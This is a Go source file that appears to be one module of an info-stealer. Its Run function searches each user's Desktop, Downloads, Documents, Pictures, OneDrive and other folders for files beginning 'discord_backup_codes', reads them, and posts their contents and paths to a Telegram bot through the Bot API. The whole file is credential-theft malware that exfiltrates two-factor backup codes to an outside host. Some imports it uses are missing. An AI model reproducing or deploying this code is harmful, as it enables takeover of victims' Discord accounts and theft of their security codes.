package discodes

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/benzoXdev/oxil/utils/hardware"
)

// Telegram metin gönderme fonksiyonu (diðer modüllerden ayný þekilde)
func sendTextToTelegram(botToken, chatID, text string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	payload := map[string]string{
		"chat_id":    chatID,
		"text":       text,
		"parse_mode": "Markdown",
	}

	jsonData, _ := json.Marshal(payload)
	resp, err := http.Post(url, "application/json", strings.NewReader(string(jsonData)))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("sendMessage failed: %d", resp.StatusCode)
	}
	return nil
}

func Run(botToken string, chatID string) {
	for _, user := range hardware.GetUsers() {
		for _, baseDir := range []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		} {
			if _, err := os.Stat(baseDir); err != nil {
				continue
			}

			filepath.Walk(baseDir, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil // Hata olursa atla
				}

				if info.IsDir() {
					return nil
				}

				// 2 MB'den büyük dosyalarý atla (eski davranýþ ayný)
				if info.Size() > 2*1024*1024 {
					return nil
				}

				// Sadece discord_backup_codes ile baþlayan dosyalar
				if !strings.HasPrefix(info.Name(), "discord_backup_codes") {
					return nil
				}

				data, err := os.ReadFile(path)
				if err != nil {
					return nil
				}

				// Telegram mesajý hazýrla
				message := fmt.Sprintf(
					"*?? Discord Backup Codes Bulundu*\n\n"+
						"**Dosya Yolu:** `%s`\n\n"+
						"**Ýçerik:**\n```"+
						"%s"+
						"```",
					path,
					string(data),
				)

				// Gönder
				_ = sendTextToTelegram(botToken, chatID, message)

				return nil
			})
		}
	}
}